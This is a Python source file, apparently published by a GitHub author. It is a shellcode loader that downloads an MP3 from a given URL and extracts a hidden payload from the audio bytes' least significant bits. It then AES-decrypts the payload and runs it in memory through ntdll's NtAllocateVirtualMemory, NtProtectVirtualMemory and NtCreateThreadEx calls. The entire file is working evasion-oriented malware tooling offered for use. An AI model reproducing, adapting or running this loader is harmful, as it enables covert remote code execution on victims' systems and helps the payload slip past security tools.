# Code By:Tas9er / https://www.github.com/Tas9er
import requests
import struct
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import random
import string
import ctypes
import cffi
def generate_random_string(length):
 S=string.digits+string.ascii_letters
 U=''.join(random.choices(S,k=length))
 return U
def download_mp3(url):
 C=requests.get(url)
 C.raise_for_status()
 return bytearray(C.content)
def extract_lsb_data(F):
 N=[]
 for i in range(4*8):
  f=F[i]
  X=(f>>0)&1
  N.append(X)
 q=bytearray()
 for i in range(0,32,8):
  L=N[i:i+8]
  f=0
  for j in range(8):
   f|=L[j]<<(7-j)
  q.append(f)
 A=struct.unpack('>I',q)[0]
 Y=A*8
 n=4*8
 if(n+Y)>len(F)*8:
  raise ValueError("隐写数据不完整")
 a=[]
 for i in range(n,n+Y):
  f=F[i]
  X=f&1
  a.append(X)
 y=bytearray()
 for i in range(0,len(a),8):
  L=a[i:i+8]
  f=0
  for j in range(8):
   if j<len(L):
    f|=L[j]<<(7-j)
  y.append(f)
 return y
def main():
 M=argparse.ArgumentParser(description="ShellCode加载器")
 M.add_argument('--cnm',required=True,help='包含隐写数据的MP3文件URL')
 j=M.parse_args()
 F=download_mp3(j.cnm)
 y=extract_lsb_data(F)
 iv=y[:16]
 o=y[16:32]
 G=y[32:]
 T=AES.new(o,AES.MODE_CBC,iv)
 v=unpad(T.decrypt(G),AES.block_size)
 l=v
 U=generate_random_string(1024)
 print(U)
 h=0x40
 x=0x04
 e=0x1000
 J=0x2000
 b=0x00000000
 w=0xFFFFFFFF
 W=cffi.FFI()
 d=ctypes.WinDLL("ntdll",use_last_error=True)
 W.cdef("""
        typedef unsigned long NTSTATUS;
        NTSTATUS NtAllocateVirtualMemory(
            void* ProcessHandle,
            void** BaseAddress,
            unsigned long ZeroBits,
            size_t* RegionSize,
            unsigned long AllocationType,
            unsigned long Protect
        );
        NTSTATUS NtProtectVirtualMemory(
            void* ProcessHandle,
            void** BaseAddress,
            size_t* RegionSize,
            unsigned long NewProtect,
            unsigned long* OldProtect
        );
        NTSTATUS NtCreateThreadEx(
            void** ThreadHandle,
            unsigned long DesiredAccess,
            void* ObjectAttributes,
            void* ProcessHandle,
            void* StartRoutine,
            void* Argument,
            unsigned long CreateFlags,
            size_t ZeroBits,
            size_t StackSize,
            size_t MaximumStackSize,
            void* AttributeList
        );
    """ )
 O=W.dlopen("ntdll.dll")
 r=W.new("void*[]",[W.NULL])
 p=W.new("size_t*",len(l))
 g=O.NtAllocateVirtualMemory(W.cast("void*",-1),r,0,p,e|J,x)
 if g!=b:
  print("NtAllocateVirtualMemory失败,错误代码:",g)
  exit(1)
 W.memmove(r[0],l,len(l))
 u=W.new("unsigned long*")
 g=O.NtProtectVirtualMemory(W.cast("void*",-1),r,p,h,u)
 if g!=b:
  print("NtProtectVirtualMemory失败,错误代码:",g)
  exit(1)
 c=W.new("void*[]",[W.NULL])
 g=O.NtCreateThreadEx(c,0x1FFFFF,W.NULL,W.cast("void*",-1),r[0],W.NULL,0,0,0,0,W.NULL)
 if g!=b:
  print("NtCreateThreadEx失败,错误代码:",g)
  exit(1)
 s=ctypes.WinDLL("kernel32",use_last_error=True)
 s.WaitForSingleObject.argtypes=(ctypes.c_void_p,ctypes.c_ulong)
 t=ctypes.c_void_p(int(W.cast("uintptr_t",c[0])))
 s.WaitForSingleObject(t,w)
 print("ShellCode执行完毕")
if __name__=='__main__':
 main()

